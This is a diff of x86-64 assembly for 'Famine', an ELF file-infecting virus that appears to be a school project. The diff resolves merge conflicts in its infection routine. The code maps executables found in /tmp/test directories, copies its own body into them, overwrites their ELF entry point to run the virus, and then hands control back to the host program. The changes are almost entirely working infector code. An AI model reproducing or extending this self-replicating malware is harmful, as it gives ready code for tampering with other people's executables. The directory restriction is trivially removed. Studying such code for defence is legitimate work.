@@ -7,24 +7,16 @@ section .text
     dir db              "[+] dir",10,0  ;9
 
     global _start
+    _host:
+        mov rax, SC_EXIT
+        syscall
 
     _start:
-<<<<<<< HEAD
         PUSH_ALL
         push rsp
         ; this trick allows us to access Famine members using the VAR macro
         mov rbp, rsp
         sub rbp, Famine_size            ; allocate Famine struct on stack
-=======
-
-    push rdi
-    push rsi
-    push rdx
-
-    ; this trick allows us to access Famine members using the VAR macro
-    mov rbp, rsp
-    sub rbp, Famine_size            ; allocate Famine struct on stack
->>>>>>> master
 
         ; load virus entry
         lea rax, _start
@@ -311,7 +303,6 @@ section .text
                    mov rdi, VAR(Famine.mmap_ptr)
                    add rdi, VAR(Famine.virus_offset)
 
-<<<<<<< HEAD
                    push rdi                        
 
                    mov ecx, dword VAR(Famine.virus_size)
@@ -332,40 +323,6 @@ section .text
                    mov rax, VAR(Famine.mmap_ptr)
                    mov rbx, VAR(Famine.new_entry)
                    mov [rax + Elf64_Ehdr.e_entry], rbx
-=======
-                    mov rsi, VAR(Famine.virus_entry)
-                    mov rdi, VAR(Famine.mmap_ptr)
-                    add rdi, VAR(Famine.virus_offset)
-                    mov ecx, dword VAR(Famine.virus_size)
-                    cld
-                    rep movsb
-
-                    ; Cambiamos el e_entry del Elf64_Ehdr:
-                    ; *(Famine.mmap_ptr + offsetof(Elf64_Ehdr, e_entry)) = new_entry
-                    mov rax, VAR(Famine.mmap_ptr)
-                    add rax, Elf64_Ehdr.e_entry
-                    mov rbx, VAR(Famine.new_entry)
-                    mov [rax], rbx
->>>>>>> master
-
-                    ; Escribimos el valor del new_entry en el payload para poder recuperarlo
-                    ; y calcular offsets
-                    lea rax, [rdi - 16] ; posicion de virus_entry dq
-                    mov [rax], rbx
-
-                    ; Calculamos el offset introducido por el loader
-                    lea rax, [_start]       ; = offset + entry
-                    lea rbx, [_finish - 16] ; = entry
-                    sub rax, [rbx]
-
-                    ; rax ahora contiene el offset introducido por el loader
-                    mov VAR(Famine.loader_offset), rax
-
-                    ; rdi = mmap_ptr + virus_offset + virus_size (despues de la escritura)
-                    ; rdi - 8 por tanto apunta al parametro a pincho "original_entry"
-                    mov rax, VAR(Famine.original_entry)
-                    lea rbx, [rdi - 8]
-                    mov [rbx], rax
 
                 .munmap:
                     ;munmap(map_ptr, )
@@ -404,7 +361,6 @@ section .text
             cmp byte [rdi], 0   ; find double null
             jnz .open_dir
 
-<<<<<<< HEAD
         .jump:
             mov rsp, rbp
             add rsp, Famine_size
@@ -417,45 +373,15 @@ section .text
             add rax, [rel host_entry]    ; Dirección host (Base + Offset)
 
             jmp rax
-=======
-        .maybe_jump_to_program:
-
-            ; Cargamos el valor de "original_entry" dejado por la anterior ejecucion de Famine sobre
-            ; este fichero
-            lea rax, [_finish-8]
-            mov rax, [rax]
-
-            ; Comprobamos si es 0. Si lo es, somos la primera ejecucion de famine: no hay que devolver
-            ; el control a nadie
-            test rax, rax
-            jnz .jump_to_program
->>>>>>> master
 
         .exit:
+            pop rsp
             mov rax, SC_EXIT
             syscall
-<<<<<<< HEAD
     
         dirs db         "/tmp/test",0,"/tmp/test2",0,0
         Traza db         "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
         hello db            "[+] Hello",10,0  ;11
         host_entry  dq   _host
         virus_vaddr dq   _start  
-=======
-
-        .jump_to_program:
-            add rax, VAR(Famine.loader_offset)
-            sub rbp, Famine_size
-            pop rdx
-            pop rsi
-            pop rdi
-            jmp rax
-
-    dirs db         "/tmp/test",0,"/tmp/test2",0,0
-    Traza db         "Famine version 1.0 (c)oded by tomartin & carce-bo"
-    hello db            "[+] Hello",10,0  ;11
-    virus_entry dq  0
-    original_entry dq 0
-
->>>>>>> master
     _finish:
